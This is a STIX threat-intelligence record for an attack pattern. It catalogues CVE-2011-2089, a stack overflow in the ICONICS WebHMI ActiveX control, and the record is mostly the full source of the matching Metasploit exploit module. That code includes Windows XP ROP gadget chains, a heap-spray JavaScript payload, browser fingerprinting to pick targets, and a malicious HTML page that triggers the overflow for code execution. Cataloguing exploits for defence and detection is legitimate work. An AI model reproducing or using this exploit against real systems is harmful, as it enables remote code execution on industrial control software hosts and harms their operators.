{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7ea6616b-b715-47d4-9dee-216a93c4d9f7",
    "created": "2024-08-14T16:39:13.925386Z",
    "modified": "2024-08-14T16:39:13.92539Z",
    "name": "\"ICONICS WebHMI ActiveX Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in ICONICS WebHMI's ActiveX control. By supplying a long string of data to the 'SetActiveXGUID' parameter, GenVersion.dll fails to do any proper bounds checking before this input is copied onto the stack which causes a buffer overflow, and results arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/iconics_webhmi_setactivexguid.rb",
            "external_id": "iconics_webhmi_setactivexguid.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2089"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-assessment.com/files/documents/advisory/ICONICS_WebHMI.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/alerts/ICS-ALERT-11-080-02"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ICONICS WebHMI ActiveX Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in ICONICS WebHMI's ActiveX control.\n        By supplying a long string of data to the 'SetActiveXGUID' parameter, GenVersion.dll\n        fails to do any proper bounds checking before this input is copied onto the stack,\n        which causes a buffer overflow, and results arbitrary code execution under the context\n        of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Scoot Bell <scott.bell[at]security-assessment.com>',\n          'Blair Strang <blair.strang[at]security-assessment.com>',\n          'sinn3r',  #Metasploit port\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-2089'],\n          ['OSVDB', '72135'],\n          ['URL', 'http://www.security-assessment.com/files/documents/advisory/ICONICS_WebHMI.pdf'],\n          ['EDB', '17240'],\n          ['URL', 'https://www.cisa.gov/uscert/ics/alerts/ICS-ALERT-11-080-02']\n        ],\n      'Payload'        =>\n        {\n          'BadChars'         => \"\\x00\",\n          'StackAdjustment'  => -3500,\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC'         => \"seh\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Automatic', {}\n          ],\n          [\n            'IE 6/7/8 on Windows XP SP3',\n            {\n              'Offset'       => 510,         #Offset to where ROP gadgets begin\n              'Ret'          => 0x770167b0,  #PUSH ESP; POP EBP; RETN 8\n              'Max'          => 4500,        #Max buffer size used\n            },\n          ],\n          [\n            'IE 7 on Windows Vista',\n            {\n              'Ret'          => 0x0c0c0c0c,  #Target spray\n              'blockSize'    => \"0x1000\",\n              'spraySize'    => \"0x8500\",\n              'Max'          => 4500,\n            },\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-05-05',\n      'DefaultTarget'  => 0))\n  end\n\n  def junk\n    return rand_text(4).unpack(\"L\")[0].to_i\n  end\n\n  def repeat(addr, rep)\n    arr = []\n    rep.times { arr << addr }\n    return arr\n  end\n\n  def on_request_uri(cli, request)\n\n    my_target = ''\n    agent = request.headers['User-Agent']\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE (6|7)\\.\\d/\n      my_target = targets[2]\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7\\.\\d/\n      my_target = targets[2]\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8\\.0/\n      my_target = targets[1]\n    else\n      send_not_found(cli)\n      print_error(\"Unknown User-Agent\")\n      return\n    end\n\n    js = ''\n    sploit = ''\n\n    if my_target['spraySize'] == nil\n\n      #ROP tekniq is only used against IE 8 + XP SP3 (ENG), since the gadgets are specific\n      #to the service pack (non or fully patched)\n\n      rop_gadgets = [\n        my_target.ret,\n        junk,\n        0x7e45c67f,              #XCHG EAX,EBP; RETN (USER32.dll)\n        repeat(junk, 2),\n        0x7e440639,              #ADD ESP,10; POP EDI; POP ESI; POP EBX; RETN USER32.dll\n        0x7c801ad4,              #Kernel32.VirtualProtect\n        junk,                    #Initial ESP + 8 p1 = retaddr\n        junk,                    #p2 - lpaddr\n        junk,                    #p3 - size\n        junk,                    #p4 - perms\n        junk,                    #p5 - oldperms\n        junk,\n        #Return address\n        0x7e4462ed,              #XCHG EAX,ECX; RETN (USER32.dll)\n        0x7c902b50,              #MOV EDX, ECX; RETN (ntdll.dll)\n        repeat(0x77aa2d96, 20),  #INC ECX * 21 (CRYPT32.dll)\n        0x7c901726,              #MOV EAX, EDX; RETN (ntdll.dll)\n        repeat(0x5b86a17b, 2),   #ADD EAX,7B; RETN * 2 (NETAPI32.dll)\n        repeat(0x77c34fbd, 2),   #ADD EAX,5C; RETN * 2 (msvcrt.dll)\n        0x7E76EA74,              #MOV DWORD PTR DS:[ECX],EAX; RETN (SXS.dll)\n        #Shellcode pointer\n        repeat(0x77aa2d96, 4),   #INC ECX * 4 (CRYPT32.dll)\n        0x7E76EA74,              #MOV DWORD PTR DS:[ECX],EAX; RETN (SXS.dll)\n        #Size  (0x400 bytes)\n        repeat(0x77aa2d96, 4),   #INC ECX * 4 (CRYPT32.dll)\n        0x7e721a99,              #POP EAX; RETN (SXS.dll)\n        0x3BFFF9CB,              #Value to XOR\n        0x7e7560b5,              #XOR EAX,3bfffdcb (SXS.dll)\n        0x7E76EA74,              #MOV DWORD PTR DS:[ECX],EAX; RETN (RPCRT4.dll)\n        #NewProtect\n        repeat(0x77aa2d96, 4),   #INC ECX * 4 (CRYPT32.dll)\n        0x7E456160,              #XOR EAX,EAX; RETN (USER32.dll)\n        0x7E4193BA,              #ADD AL,3B (USER32.dll)\n        repeat(0x7E442074, 5),   #INC EAX; RETN (USER32.dll)\n        0x7E76EA74,              #MOV DWORD PTR DS:[ECX],EAX; RETN (USER32.dll)\n        #OldProtect\n        repeat(0x77aa2d96, 4),   #INC ECX * 4 (CRYPT32.dll)\n        0x7e721a99,              #POP EAX (SXS.dll)\n        0x10010570,              #EAX (Wriable memory)\n        0x7E76EA74,              #MOV DWORD PTR DS:[ECX],EAX; RETN (USER32.dll)\n        #Call VirtualProtect\n        repeat(0x7E421AAF, 20),  #DEC ECX; RETN (USER32.dll)\n        0x7E4462ED,              #XCHG EAX,ECX; RETN (USER32.dll)\n        0x7E45F257,              #XCHG EAX,ESP; RETN (USER32.dll)\n        repeat(junk, 2),         #Align shellcode\n        ].flatten.pack('V*')\n\n        sploit << Rex::Text.to_unescape(rand_text_alpha(my_target['Offset']), Rex::Arch.endian(target.arch))\n        sploit << Rex::Text.to_unescape(rop_gadgets, Rex::Arch.endian(target.arch))\n        sploit << Rex::Text.to_unescape(make_nops(80), Rex::Arch.endian(target.arch))\n        sploit << Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n        sploit << rand_text_alpha(my_target['Max']-sploit.length)\n\n    else\n\n      #If we don't have to ROP, then we just spray against the rest of the targets\n\n      shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n      target_ret = [my_target.ret].pack('V')\n      nops = Rex::Text.to_unescape(target_ret*4, Rex::Arch.endian(target.arch))\n      sploit << Rex::Text.to_unescape(target_ret * (my_target['Max'] / 4), Rex::Arch.endian(target.arch))\n\n      js_func_name        = rand_text_alpha(rand(6) + 3)\n      js_var_blocks_name  = rand_text_alpha(rand(6) + 3)\n      js_var_shell_name   = rand_text_alpha(rand(6) + 3)\n      js_var_nopsled_name = rand_text_alpha(rand(6) + 3)\n      js_var_index_name   = rand_text_alpha(rand(6) + 3)\n\n      js = <<-EOS\n      <script>\n      function #{js_func_name}() {\n        var #{js_var_blocks_name} = new Array();\n        var #{js_var_shell_name} = unescape(\"#{shellcode}\");\n        var #{js_var_nopsled_name} = unescape(\"#{nops}\");\n        while (#{js_var_nopsled_name}.length < #{my_target['blockSize']}) { #{js_var_nopsled_name} += #{js_var_nopsled_name} };\n        for (var #{js_var_index_name}=0; #{js_var_index_name} < #{my_target['spraySize']}; #{js_var_index_name}++) {\n          #{js_var_blocks_name}[#{js_var_index_name}] = [ \"\" + #{js_var_nopsled_name} + #{js_var_shell_name} ].join(\"\");\n        }\n      }\n      #{js_func_name}();\n      </script>\n      EOS\n\n    end\n\n    obj_id      = rand_text_alpha(rand(6) + 3)\n    sploit_name = rand_text_alpha(rand(6) + 3)\n\n    html = <<-EOS\n    <html>\n    <head>#{js}</head>\n    <body>\n    <object classid=\"clsid:D25FCAFC-F795-4609-89BB-5F78B4ACAF2C\" id=\"#{obj_id}\"></object>\n    <script>\n    var #{sploit_name} = unescape(\"#{sploit}\");\n    #{obj_id}.SetActiveXGUID(#{sploit_name});\n    </script>\n    </body>\n    </html>\n    EOS\n\n    html = html.gsub(/^ {4}/, \"\")\n\n    print_status(\"Sending malicious page\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-05-05",
    "x_mitre_platforms": [
        "win'"
    ]
}